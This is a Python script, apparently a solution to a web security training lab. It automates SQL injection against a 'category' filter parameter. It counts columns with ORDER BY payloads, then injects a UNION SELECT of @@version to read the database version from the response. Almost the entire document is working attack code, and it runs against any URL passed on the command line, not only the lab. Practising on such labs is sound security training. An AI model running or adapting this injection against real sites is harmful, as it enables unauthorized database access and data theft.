import requests
import sys
from bs4 import BeautifulSoup



def get_num_of_columns(lab_url, session):
    num_of_columns = 0
    for i in range(1, 20):
        response = session.get(f"{lab_url}/filter?category=x'+ORDER+BY+{i}%23", timeout=10)
        if response.status_code == 500:
            num_of_columns = i - 1
            break
    if num_of_columns != 0:
        return num_of_columns


def get_db_version(lab_url, session, num_of_columns):
    for i in range(num_of_columns):
        payload = ["NULL"] * num_of_columns
        payload[i] = "@@version"
        payload = ",".join(payload)
        url = f"{lab_url}/filter?category=x'+UNION+SELECT+{payload}%23"
        response = session.get(url, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            version_string = soup.find("tbody").get_text().strip()
            return version_string


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        lab_url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Retrieving database version information...")
        num_of_columns = get_num_of_columns(lab_url, session)
        if not num_of_columns:
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        db_version = get_db_version(lab_url, session, num_of_columns)
        if db_version:
            print(f"(+) Database Version Information: {db_version}")
        else:
            print("(-) Unable to retrieve database version information.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()
